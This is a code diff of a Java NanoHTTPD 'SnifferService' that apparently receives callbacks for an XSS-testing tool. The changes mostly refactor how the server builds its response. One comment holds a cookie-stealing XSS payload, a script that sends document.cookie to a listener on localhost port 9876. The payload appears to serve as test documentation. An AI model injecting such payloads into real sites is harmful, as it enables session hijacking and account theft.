@@ -1,11 +1,14 @@
+package com.github.eljah;
+
+import com.github.eljah.utils.ResourceGenerator;
 import fi.iki.elonen.NanoHTTPD;
-import fi.iki.elonen.ServerRunner;
 import org.apache.log4j.Logger;
 
+import java.io.FileInputStream;
+import java.io.FileNotFoundException;
 import java.io.IOException;
 import java.util.ArrayList;
 import java.util.List;
-import java.util.Map;
 
 /**
  * Created by Ilya Evlampiev on 08.06.15.
@@ -13,6 +16,7 @@ import java.util.Map;
 public class SnifferService extends NanoHTTPD {
     //<script> img = new Image(); img.src = "http://localhost:9876/adasdasdas.gif?"+document.cookie; </script>
     List<XSSCheck> xsschecks = new ArrayList<XSSCheck>();
+    ResourceGenerator resourceGenerator;
 
     private static final Logger log = Logger.getLogger(SnifferService.class);
 
@@ -29,6 +33,11 @@ public class SnifferService extends NanoHTTPD {
 
     public void addXSSCheck(XSSCheck x) {
         this.xsschecks.add(x);
+    }
+
+    public void setResourceGenerator(ResourceGenerator rg)
+    {
+        resourceGenerator=rg;
     }
 
     @Override
@@ -52,10 +61,8 @@ public class SnifferService extends NanoHTTPD {
             }
         }
 
-        String msg = "<html><body><h1>Hello server</h1>\n";
-        msg += "</body></html>\n";
+        return resourceGenerator.responceOfResource();
 
-        return new NanoHTTPD.Response(msg);
     }
 
     public void stop() {
